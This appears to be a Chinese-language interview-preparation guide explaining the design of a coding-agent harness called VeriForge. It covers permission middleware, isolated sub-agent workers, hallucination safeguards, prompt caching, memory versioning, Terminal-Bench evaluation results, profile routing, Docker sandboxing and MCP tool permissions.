- **权限模式命名**：`workspace-write`、`danger-full-access` 明显受 Codex 影响。但 VeriForge 没停在沙箱层，而是每个 tool call 都经过 `PermissionPolicy`，risky shell 需要审批，黑名单 shell 永远阻断。
- **结构化工具调用**：`run_bash`、`apply_patch`、Agent 和 MCP 工具都要经过 schema、registry、permission 与 middleware。

### 我自己做的改造

最大的改造是把这些东西统一成 Harness runtime，而不是散在 prompt 里。

1. **中间件链**：权限、循环检测、错误恢复、任务追踪、退出验证都做成 middleware。这样 profile 可以换策略，主循环不用写一堆 if/else。
2. **保守并行的 ToolExecutor**：连续只读工具可以并发，写文件和有副作用 shell 打串行屏障。这个比全串行快，但不冒险重排模型的语义顺序。
3. **长运行 shell job**：`npm run dev` 这种命令变成后台 job，agent 可以读日志、列 job、停止 job，而不是卡到超时。
4. **Observation Store**：文件被修改后，旧的文件观察会自动 stale，防止模型拿旧内容继续推理。
5. **退出验证**：模型说完成不算，必须对照原始需求跑验证，Python 文件还会做静态检查。

**R（结果）**：最后形成的取舍是：交互体验上学 Claude Code，执行安全上学 Codex，但核心差异是我把它做成了可配置、可测试、可审计的 runtime。面试时我不会说"我比它们更好"，我会说：我理解它们各自解决的问题，然后根据这个项目的目标做了不同的工程取舍。

---

**关键心法**：别说"参考了某某产品"就结束。要讲清楚参考的是哪一层：交互层、执行层、权限层、上下文层；哪些是直接借鉴，哪些是你为了自己项目重新做的 trade-off。

---

## Q: Multi-Agent 在你的项目里有体现吗？怎么做的？

> 有，但采用的是 **持久 Agent 线程 + 隔离变更提案**。子 Agent 可以跨主 Agent 回合继续运行，worker 不能直接写主工作区。

### 架构：一个 Orchestrator + 五种角色

`AgentCoordinator` 在 session 内管理 Agent 的创建、消息、等待、中断和关闭。每个 Agent 保留独立 conversation，可以用 `followup_agent` 延续。

| Profile | 模式 | 职责 |
|---|---|---|
| `explorer` | read-only | 调查代码位置和调用链 |
| `test_designer` | read-only | 设计测试与边界案例 |
| `reviewer` | read-only | 查找 correctness / regression 风险 |
| `verifier` | read-only | 独立核验证据和验收结果 |
| `worker` | isolated write | 在隔离副本中修改，生成 `ChangeProposal` |

默认上限是 6 turns、300 秒。`allowed_paths` 定义 worker 的写入范围。

### 两层安全边界

第一层是角色工具面：只读角色不能编辑，worker 只能写 ownership 范围。第二层是隔离：worker 使用持久临时副本，主工作区只接受显式 apply。

### 并行如何发生

主 Agent 在同一轮发出多个 `spawn_agent` 即可并行。所有 Agent 共用 subagent limiter；多个 worker 的 ownership 不能重叠。

### 为什么不是对等自治 Multi-Agent

- 子 Agent 不能递归委派或控制其他 Agent。
- 只读角色不能修改文件。
- worker 只修改隔离副本，不直接合并。
- 任务完成、用户沟通和主工作区写入仍由 orchestrator 决定。

应用提案时先做三方合并。无重叠修改自动合并；真实冲突保留为独立制品，由主 Agent 显式解决。源文件不会出现冲突标记。

### 如果面试官追问"和 AutoGen / CrewAI 有什么区别？"

AutoGen/CrewAI 更强调 Agent 通过消息协商和对等协作；VeriForge 更像一个带角色和隔离边界的任务委派系统。它牺牲一部分自治性，换取主工作区只有一个决策者、Patch 可审查、终止与成本有明确上限。

---

## Q: 大模型出现幻觉你怎么 Harness 的？

> 我会先说清楚：在 coding agent 里，幻觉不是"回答错一句话"这么简单。它可能会编一个不存在的文件、基于旧代码继续改、反复跑错误命令，最后还告诉你完成了。所以我的思路不是消灭幻觉，而是让幻觉尽量不能直接变成破坏性的文件修改或错误结论。

### 用 STAR 讲

**S（背景）**：LLM 在写代码时常见的幻觉有几类：路径是假的、文件内容记错了、API 或命令编错了、失败后还在重复尝试、没有验证就说完成。

**T（任务）**：我要做的 Harness 不是要求模型永远不犯错，而是把错误拦在 runtime 边界上。简单说就是：模型可以想错，但不能静悄悄地错下去。

**A（行动）**：我做了四道防线。

第一道是 **工具参数防线**。工具调用前有 `_validate_and_fix()` 做轻量校验。比如 `write_file` 空路径直接失败；模型把 `/workspace/app.py` 这种绝对路径传进来，会尝试转成工作区相对路径；`vim`、`nano`、`top` 这种交互命令会被拦掉。`apply_patch` 也要求 search text 在文件里恰好匹配一次，如果模型基于幻想的旧内容打补丁，就不会改到文件。

第二道是 **事实新鲜度防线**。这是我觉得最关键的一层。Observation Store 会记录每次工具观察依赖了哪些文件，以及当时的文件 generation。只要后面 `write_file` 或 `apply_patch` 改了文件，之前引用这个文件的观察就会被标记为 stale，并注入 `FACT INVALIDATION`。这相当于告诉模型："你刚才记住的那个文件版本已经不可信了，重新读。"

第三道是 **失败恢复防线**。模型如果连续编辑同一个文件、连续跑类似命令失败，`LoopDetectionMiddleware` 会提醒它不要原地打转。`RecoveryStrategyMiddleware` 会把状态切到 `ENV_FIX`、`SPEC_RECHECK` 或 `RETHINK`，有些状态下会暂时禁止写文件，逼它先诊断根因。`ErrorGuidanceMiddleware` 则针对 command not found、import error、编译错误这类常见失败给具体建议。

第四道是 **退出验证防线**。我不相信模型说"做完了"。`PreExitVerificationMiddleware` 会在它第一次想退出时重新注入原始需求，要求它对照真实文件和命令输出验证；`StaticVerifierMiddleware` 会对改过的 Python 文件跑 `ast.parse()` 和 `ruff check --diff`。所以"完成"不是一句自然语言，而是要有可执行证据。

### R（结果）

这样做以后，幻觉不会完全消失，但它会变成可见、可拦截、可恢复的事件：假的 patch 会失败，旧事实会 stale，重复失败会触发恢复策略，没有验证的退出会被拦住。面试里我会总结成一句话：**Harness 的核心不是相信模型更聪明，而是把模型最容易错的地方放到 runtime 里验证。**

---

## Q: Vibe coding 时怎么确认 AI 生成的代码质量？

> 我不会把 vibe coding 理解成"不看质量，代码出来就算"。我的理解是：用自然语言快速驱动实现，但质量标准要前置，验收要自动化。也就是说，速度来自 AI，质量来自流程和工具。

### 用 STAR 讲

**S（背景）**：vibe coding 的优势是快，但风险也明显：需求容易说不清、模型容易漏边界条件、写完后还可能没跑过。最大的问题不是它会犯错，而是你可能很晚才发现它错了。

**T（任务）**：所以我做质量控制时，不是靠最后人工逐行 review，而是把质量拆到三个阶段：写之前定义标准，写的时候限制偏航，写完以后用可执行证据验收。

### 第一阶段：质量前置

我会先把 prompt 从"帮我做一个功能"改成"完成标准是什么"。比如不是只说"做一个 CSV 统计脚本"，而是补上：

```text
完成标准：
- 能读取 CSV 并输出每列缺失率
- 空文件、缺列名、非 UTF-8 输入要有可理解的错误提示
- 运行 python script.py sample.csv 不报错
- 至少有一个正常样例和一个异常样例测试
```

如果需求稍微复杂，我不会直接让 agent 开写，而是先走 `plan` profile。它只能调查和写计划，不能改代码。这个阶段的价值是逼模型先问清楚边界：改哪些文件、影响哪些模块、怎么验证、哪些情况不做。

### 第二阶段：过程约束

实现时我会让 agent 尽量先写测试或至少写验证命令。这里不一定要追求非常教科书式的 TDD，但要把"对不对"变成可以执行的东西。比如让它先补 `test_empty_input`、`test_valid_csv_output`，再实现逻辑。

这个项目里对应的是 `update_plan_state` 和中间件链。复杂任务会要求先更新计划；失败多了会触发 recovery；同一个文件或命令反复失败会触发 loop detection。这样 agent 不会在一个错误方向上一直硬撞。

### 第三阶段：结果验收

写完以后我不接受一句"完成了"。至少要看三类证据：

1. **功能证据**：跑了相关测试、脚本、构建命令，输出符合预期。
2. **静态证据**：语法、lint、类型或格式检查没有关键错误。
3. **变更证据**：`git diff` 里只改了该改的文件，没有顺手重构或引入无关依赖。

VeriForge 里把这件事自动化了一部分：`PreExitVerificationMiddleware` 会在退出前要求 agent 对照原始需求验证；`StaticVerifierMiddleware` 会对改过的 Python 文件跑 `ast.parse()` 和 `ruff check --diff`；Observation Store 会防止它基于旧文件内容继续写；EventBus 和 observability 可以回看它到底跑过什么命令、改过什么文件。

### R（结果）

这样做的结果是，vibe coding 仍然保留速度，但质量不完全靠人肉兜底。我的 review 重点也会更集中：看边界条件、看第三方 API 有没有幻觉、看副作用范围，而不是每一行都重新写一遍。

面试里我会总结成一句话：**vibe coding 不是放弃工程纪律，而是把工程纪律前置和自动化。需求靠验收标准收口，过程靠计划和中间件约束，结果靠测试、静态检查和 diff 验证。**

---

## Q: Prompt Cache 怎么设计的？效果怎么量化？

> Prompt cache 在 coding agent 里特别重要，因为每次 LLM 调用都会发送完整的 system prompt + tool schemas + 历史对话。如果前缀不稳定，每次都是 cache miss，成本和延迟都会翻倍。

### 结构层设计：前缀稳定性

LLM 的 prompt cache 机制是前缀匹配的 — 只要请求的前缀和之前的请求相同，就能命中缓存。所以我们的设计原则是：**让 system prompt + tool schemas 永远固定在请求最前面，对话历史只在尾部追加式增长**。

具体来说：

1. `AgentConversation.__init__()` 把 system prompt 作为 `messages[0]`，后续永远不修改它
2. tool schemas 在 `Agent.__init__()` 时确定，运行中只有 MCP 重连才会变（`update_tool_schemas()` 对比 schemas 是否真的变了，没变不触发 cache key 失效）
3. `_canonical_tool_schemas()` 对 tool schemas 做排序和规范化，确保不同注册顺序产生相同的 hash
4. 对话历史只在 `messages` 尾部追加，不会在中间插入或重排

### 可观测层设计：`PromptCacheShape`

每次 LLM 调用时，`capture_prompt_cache_shape()` 会对 system prompt 和 tool schemas 分别做 SHA-256 hash，生成一个 `PromptCacheShape` 快照。下次调用时，`compare_prompt_cache_shapes()` 对比两次快照，如果 hash 变了，会记录 `prefix_change_reasons`（`"system"` / `"tools"` / `"log_rewrite"`），这样可以精确诊断是什么导致了 cache miss。

LLM 返回的 `usage` 里有 `cache_hit_tokens` 和 `cache_miss_tokens`，我们提取出来写入 trace，可以计算每次调用的 cache 命中率。

### 量化效果

固定 warmup 评测的结果是：DeepSeek context cache 从 **29.2% 提升到 99.1%**。这个数字对应仓库中的评测记录；没有对应 artifact 的旧实验平均值或单次 compaction 后比例，不当作结论。

### 什么会破坏 cache？

| 事件 | 影响 | 恢复 |
|---|---|---|
| 对话历史追加（正常） | 不影响 — 只在尾部增长 | — |
| Compaction 触发 | 旧消息被摘要替换，尾部变化 | 下一次调用前缀仍匹配，自动恢复 |
| MCP 工具重连 | 如果 schema 变了，tools_hash 变，prefix 失效 | 需要 warmup 1 次 |
| Profile 切换 | system prompt 变了，全部 cache 失效 | 需要完整 warmup |

### 如果面试官追问"compaction 不是会重写历史消息吗？那 cache 不是全废了？"

compaction 确实重写了旧消息（把它们替换成摘要），但 **system prompt 和 tool schemas 没变**。大部分 LLM provider 的 prompt cache 是基于前缀匹配的 — 只要请求的前 N 个 token 和之前相同，这 N 个 token 就能命中 cache。所以 compaction 后：

- system prompt + tool schemas 的缓存仍然有效（前缀没变）
- 对话历史部分需要重新计算（尾部变了）
- 总体影响：稳定 system/tool 前缀仍有机会复用，但被重写的 conversation 部分需要重新 warmup。具体下降比例取决于 provider 和被改写前缀长度，不承诺一个固定数字。

---

## Q: 长期记忆如何存储、召回和纠错？

> Memory 不是一段自动拼进 prompt 的历史文本，而是一组有来源、有适用范围、有版本的可验证文档。Markdown 是正文的唯一事实源，SQLite 只承担可重建索引、后台任务、使用记录和抑制记录。

### 四层职责

```text
SessionJournal JSONL        原始逻辑消息、tool call/result、压缩边界
Structured Working Summary 当前任务的压缩与恢复状态
entries/<id>.md             人可读、可编辑的长期记忆正文与元数据
memory.db                   BM25 索引、提炼队列、租约、usage、suppression
```

项目记忆按 Git common directory 生成稳定 key，因此多个 worktree 共享同一个项目记忆空间；个人偏好写入独立 user scope。`MEMORY.md` 只是简短导航，删除 SQLite 后可以从 entry Markdown 完整重建。

### 显式写入与后台提炼

- 用户明确说“记住”时，Agent 直接调用 `memory_write`，不等待后台任务。
- 修改已有文档必须带 `expected_version`，旧版本写入会被拒绝，避免后台结果覆盖用户刚做的修改。
- 已结束会话按 journal boundary 去重后进入提炼队列。每个进程只有一个 daemon worker，使用 `fast` 模型一次完成候选提取与已有记忆比较；失败有租约和有限重试，退出不等待。
- 自动提炼只接受明确偏好、项目约定、决策背景和有证据的复用经验，排除一次性状态、临时日志、密钥、隐藏推理和易过期细节。

### 召回与适用性检查

`MemoryService.search()` 使用 BM25、中文相邻二元词和路径 token 检索 project/user 两个 scope。它只对本次命中的记忆重新计算 `source_paths` 指纹：

1. 文件未变化：保持 `active`。
2. 文件变化或消失：用版本锁改为 `review_required`，正文仍作为历史线索展示。
3. Agent 阅读当前文件并确认结论仍成立：调用 `memory_validate` 更新指纹和版本，恢复 `active`。
4. 结论已经失效：`memory_write(supersedes=<old id>, expected_version=<old version>)` 创建新文档；旧文档标记 `superseded` 并链接新文档，退出普通召回但保留审计。

记忆块始终带有 “reference only” 约束。记忆中的命令不会因为检索或后台提炼而执行；当前用户指令、项目规则和刚读取的代码事实始终优先。

### 真正遗忘为什么和 supersede 不同

一般纠错保留旧正文并标记 `superseded`，因为它对审计和解释决策变化有价值。用户明确要求忘记时，`memory_forget` 会删除正文、索引和使用记录，只留下不含原内容的哈希抑制标记。后台提炼看到相同 session evidence 时会跳过，避免被删除内容又从旧会话中长回来。

### 为什么暂时不用向量数据库

当前记忆规模适合 BM25；中文二元词和路径匹配已经覆盖代码仓库最常见的查询方式。它不需要 embedding 服务，结果可解释，索引可以从 Markdown 重建。评估采用三组双会话协议：关闭记忆、普通召回、带适用性检查召回，比较正确率、过时结论采用率、重复调查、token、延迟和提炼成本，而不是只报告一次静态 seed 的 A/B 数字。

---

## Q: 8/24/full task set 怎么选的？为什么结果口径不只看一个 benchmark run？

> 评估这里分两层：**运行入口** 用固定 task set 控制成本和复现性，**最终口径** 用 ledger 聚合每个任务最新可信结果。这样既能支持开发中的小步 rerun，也不会把某一次中断、Docker 波动或代理问题直接写成最终能力。

### 评估结果

`eval/results/SUMMARY.md` 的人类可读口径是 **Terminal-Bench 2.1 task ledger**：完整 89 任务分母下 `56/89` passed，pass rate `62.9%`，报告模型为 `DeepSeek-V4-Flash-Preview`。官方 DeepSeek Harness 在 Max reasoning 下的同模型参考值是 `61.8%`；因为 harness、推理配置和运行条件不完全相同，这里只报告并列参考，不宣称严格同场提升。强视觉任务仍计入总分母并作为 text-only 能力边界单列。其中失败类型为 `agent_timeout: 10`、`failed_verifier: 14`、`failed_without_metrics: 1`、`infra_or_setup_failure: 1`、`strong_vision_or_not_attempted: 7`。

这个数字不是“单次全量命令一次跑完”的 leaderboard 声明，而是 `eval/scripts/rebuild_eval_results.py` 从 raw `summary.json`、Harbor `result.json`、VeriForge artifacts、stdout/stderr 里重建出来的 task-level ledger。它按任务选择最新可信成功或失败，保留 attempt 覆盖、成本、tokens、tool calls 和失败类型。

### 选择标准：前置固定，不是事后挑选

`8task` / `24task` / `full` 都不是按结果挑出来的。任务集合固定在 `eval/tasks/terminal_bench_*.json`，任务 category、difficulty 和 timeout metadata 来自 `harness_code_agent/profiles/tb2_tasks.json`：

1. **类别覆盖**：覆盖不同任务类别，不集中在某一类
2. **难度分布**：包含不同难度级别的任务
3. **超时限制**：限制 `agent_timeout_sec <= 1800`，避免超长任务主导成本
4. **配置可复现**：`terminal_bench_8task.json`、`terminal_bench_24task.json`、`terminal_bench_full.json` 随代码提交，任何人可以用相同配置重跑

### 运行入口和最终 ledger

评估体系保留两类入口：

- **8-task**：低成本快速验证，用于开发迭代中的 smoke test。
- **24-task**：更大覆盖面的固定子集，适合按 category / difficulty 看趋势。
- **full**：本地 Terminal-Bench 2.1 metadata 中的完整任务名集合，用于更大规模 rerun；最终 ledger 使用 official-like 全量分母，强视觉任务计入失败，只在报告中作为能力边界单独标注。

`run_terminal_bench_eval.py` 还支持 `--task` 覆盖和 `--tbench-parallelism N`。并行时每个任务都有独立的 `harbor_jobs/<task>` 目录，避免 Harbor 状态互相污染；这也是为什么结果汇总不只看某一次 run，而是用 ledger 统一回收多次 rerun 的最新任务级事实。

### 如果面试官追问"如果有时间，你会怎么改进评估体系？"

四个方向：

1. **分层报告继续细化**：Terminal-Bench 2.1 ledger 已经能给总 pass rate，下一步更应该稳定输出 category / difficulty / failure kind 维度，而不只看总数
2. **多次运行取置信区间**：Agent 有随机性（LLM 采样温度、工具执行顺序），单次运行结果波动大。至少跑 3 次取平均和标准差
3. **对比基线**：和 raw LLM（不带 agent loop）、其他开源 Agent 做对比，才能证明是架构设计的功劳而不是 LLM 本身的能力
4. **失败根因分析**：对失败任务做分类 — 是 Agent loop 问题（循环、超时）？还是 LLM 能力问题（理解不了任务）？还是环境问题（Docker 配置、依赖缺失）？这个分析对改进 Agent 设计最有价值

---

## Q: Profile 和 Agent 的职责边界是什么？怎么自动选择 profile？

> Profile 是 **"做什么"** 的规格定义（system prompt + 工具集 + 验收标准 + middleware 组合），Agent 是 **"怎么做"** 的通用执行引擎（循环、上下文管理、tool dispatch）。Profile 是可替换的 Strategy，Agent 是固定的执行器。这是标准的 Strategy Pattern。

### Profile 封装了哪些差异

每个 Profile 子类（`BaseProfile` 的实现）通过 `main_agent()` 返回 `AgentConfig`，封装三类差异：

| 差异维度 | 示例 |
|---|---|
| **Prompt 差异** | `coding-agent` 强调代码质量和验证；`terminal` 强调 CLI 命令和非交互 benchmark；`plan` 强调调查和方案设计，禁止写代码 |
| **工具集差异** | `app-builder` 额外暴露 `browser_test`；`plan` 只暴露只读工具和 `update_plan_state`；`review` 限制为只读 + 验证 shell |
| **Middleware 差异** | 各 profile 组合不同的 middleware 链和不同的阈值参数（通过 `ProfileConfig` 可调） |

此外，`AgentCoordinator` 统一管理子 Agent 的角色权限、生命周期与隔离提案。`resolve_task_timeout()` / `resolve_task_metadata()` 管理任务超时和 metadata。

### 自动路由：`route_profile_for_turn()`

用户不需要每次手动选 profile。系统默认从 `general` 开始，每个用户 turn 进入 agent 前都会先跑本地路由：用高精度规则和 profile prototype 的 BM25 + cosine 匹配生成 `RouteDecision`。本地证据不足时，才调用一次受限的 fast model，并把上一轮任务和回答作为上下文。

这里有一个重要边界：`terminal` 不在产品自动路由候选里。它还在 `PROFILES` 中，所以 eval runner 和 `--profile terminal` 可以显式使用；TUI 的 profile 面板只展示产品 profile。

### 当前路由动作

路由动作主要有三种：

- `stay`：保持当前 profile。
- `switch_profile`：当前是 `general`，且明确匹配到 `coding-agent` / `plan` / `review` / `app-builder` 这类专用 profile。
- `direct_answer`：当前已经在专用 profile，但本轮只是普通问答；此时不切回 `general`，而是在当前 slot 注入 direct-answer 指令，避免污染实现上下文。

### 为什么不是每次都调用 LLM 路由

大多数 turn 可以由本地规则和 prototype 直接判断，不需要额外请求。遇到短句、歧义请求或专用 profile 之间的切换时，路由器才调用 fast model；请求设置 3 秒超时且不重试，低置信度、非法响应或 provider 失败都会保留当前 profile。这样把额外延迟和失败面限制在需要判断的少数 turn 内。

路由结果会进入 `profile_route_decision` event，记录 matched_profile、action、turn_mode、confidence、margin、source、是否调用 LLM 以及 fallback 原因，便于复盘为什么切了 profile，或者为什么保持原 profile。

### Fallback 安全网

路由系统的设计原则是**保守 fallback**：本地和 fast model 都没有足够证据时保持当前 profile，不自动乱跳；`terminal` 始终保持显式入口，用户 pinned 后也不会被自动路由改写。`RouteDecision` 里有 `fallback_used` 和 `fallback_reason` 字段，可以在 trace/event 里看到为什么触发 fallback。

### 扩展：新增一个 profile 需要什么？

1. 创建 `profiles/my_profile.py`，继承 `BaseProfile`，实现 `name()` + `description()` + `main_agent()`（~80-100 行）
2. 在 `profiles/__init__.py` 的 `PROFILES` 字典里注册
3. 如果希望它成为产品可见 profile，需要进入 `PRODUCT_PROFILES` 和 profile 面板选项；如果希望自动路由能识别它，还需要把 profile 加进 `profiles/router.py` 的本地 prototype 集合。否则仍可通过显式 `--profile` 使用，但不会被普通产品入口展示或自动选择。

### 如果面试官追问"profile 切换会丢上下文吗？"

TUI 层的 profile 切换使用底部 profile 选择面板：创建或重建目标 Agent 运行时，并把同一个 Conversation 重新绑定到新的 prompt 与 tools。用户选择具体模式后进入 pinned；重新选择自动模式后，才恢复本地优先、fast model 兜底的自动路由。详见 Q12。

---

## Q: Windows Shell 和 Docker sandbox 是怎么设计的？为什么要同时支持？

> 两者解决的是不同问题：`HARNESS_WINDOWS_SHELL` 规定 host 模式下命令使用哪一种明确语法，`HARNESS_SANDBOX_MODE=docker` 负责把不可信 shell 执行放进隔离容器。一个解决跨平台语义确定性，一个解决执行隔离。

### Windows host shell：显式选择，不静默降级

Windows 支持：

- `HARNESS_WINDOWS_SHELL=pwsh`：使用 PowerShell 7；
- `HARNESS_WINDOWS_SHELL=wsl`：通过 `wsl.exe --cd ... --exec bash` 使用 Linux Bash。

项目故意不提供 `auto`。如果用户选择 `pwsh` 但机器没有 `pwsh.exe`，启动时直接给出可操作错误；不会悄悄改用 Windows PowerShell、`cmd.exe` 或 WSL。原因是 Shell 语法、路径、引号和环境变量规则不同，静默 fallback 可能让同一条模型生成命令在另一后端产生不同副作用。

### Docker sandbox：按 Session 复用

设置 `HARNESS_SANDBOX_MODE=docker` 后：

1. 当前工作区挂载到容器 `/workspace`，shell 命令固定走 Linux Bash。
2. 容器按 session 懒启动并复用，避免每条命令都支付冷启动成本。
3. 默认 `HARNESS_DOCKER_NETWORK=none`，需要安装依赖时才显式改为 `bridge`。
4. POSIX 主机尽量映射当前 `uid:gid`，避免生成 root-owned 文件；Windows Docker Desktop 不强制 UID 映射。
5. 文件工具仍在宿主侧经过 `WorkspaceService`，只有 shell 命令进入容器。

### 如果面试官追问“Docker 就绝对安全吗？”

不是。工作区仍以读写方式挂载，容器命令可以修改项目文件；Docker 也不是强安全边界。它主要降低宿主环境污染和网络暴露。对完全不可信任务，仍应使用外部 VM、更严格的容器策略或一次性远程执行环境。

**关键心法**：可预测性优先于“智能兼容”。Shell 后端不猜，Sandbox 能力不夸大。

---

## Q: MCP 工具怎么接入？如何保证它不会绕过原有权限系统？

> MCP 在 VeriForge 中不是第二套工具执行器。Server 只负责提供工具描述和调用通道；工具被加载后仍然进入 session 级 `ToolRegistry`，继续经过 profile 工具面、permission、middleware、事件记录和统一 `ToolResult`。

### 配置与命名

工作区通过 `.harness/mcp.json` 配置 MCP Server，当前支持：

- `stdio`：启动本地子进程；
- `streamable_http`：连接远端 MCP 服务。

暴露后的工具统一命名为 `mcp__{server}__{tool}`，避免与内置工具或其他 Server 冲突。Server 可以声明默认 `permission`，也可以用 `tool_permissions` 对单个工具覆盖。

### 权限链

一次 MCP 调用仍要经过：

1. 当前 Profile 是否允许对应 permission；
2. 工具是否已在当前 session registry 中注册或通过 tool search reveal；
3. `PermissionMiddleware` 是否允许执行；
4. MCP Manager 发起真实调用；
5. 返回值转换为统一 `ToolResult`，进入事件、Observation 和后续 middleware。

因此一个名为 `delete` 的远端工具不会因为来自 MCP 就自动获得权限。如果配置为 `dangerous`，而当前 Profile 只允许 read/network-read，它不会被暴露或执行。

### 工具太多和 Prompt Cache 怎么办

不是把所有 MCP Schema 永久塞进初始 Prompt。可延迟披露的工具先进入 deferred catalog，需要时通过 `tool_search` reveal；只有当前真正可用的 Schema 进入模型工具面。MCP reload 后也会比较工具 Schema，只有实际变化才需要更新前缀并重新 warmup。

### 失败边界

MCP Server 的连接、协议和工具错误会转成失败 `ToolResult`，不能伪装成成功。生产化还应增加更细的连接超时、Server 健康状态、凭证轮换和远端审计。

**关键心法**：MCP 扩展的是工具来源，不扩张工具权限。
